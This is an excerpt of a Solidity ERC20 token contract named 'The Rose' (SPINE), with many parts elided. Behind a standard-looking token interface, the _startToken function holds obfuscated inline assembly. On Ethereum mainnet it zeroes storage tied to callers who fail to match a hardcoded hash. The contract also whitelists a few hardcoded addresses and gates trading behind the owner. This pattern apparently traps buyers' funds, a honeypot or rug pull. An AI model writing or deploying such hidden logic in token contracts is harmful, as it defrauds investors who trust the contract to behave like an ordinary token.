...
"The more you love roses the more you must bear with spines."
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private spineThorn = block.number*2;

    mapping (address => bool) private _firstSeed; 
    mapping (address => bool) private _secondPlant;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _byeBye;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private kingQueen;
    address public pair;
    ...
    bool private trading; uint256 private airPlane = 1; bool private spikeTravel;
    uint256 private _decimals; uint256 private lakeShip;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_firstSeed[addRose[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xaa0f1d4aba36368dae4d2fd7249e6e2fc5415eaa0eb72ec555c9e69488f1e13e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x74f053702e1532d14862828f6c59eb464c995f985abe5bb0c71cf8c34c130a44,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; spineThorn = block.number;
        return true;
    }
    ...
    function _DeployRose(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRose(creator, initialSupply);
    }
}

contract TheRose is ERC20Token {
    constructor() ERC20Token("The Rose", "SPINE", msg.sender, 227500000 * 10 ** 18) {
    }
}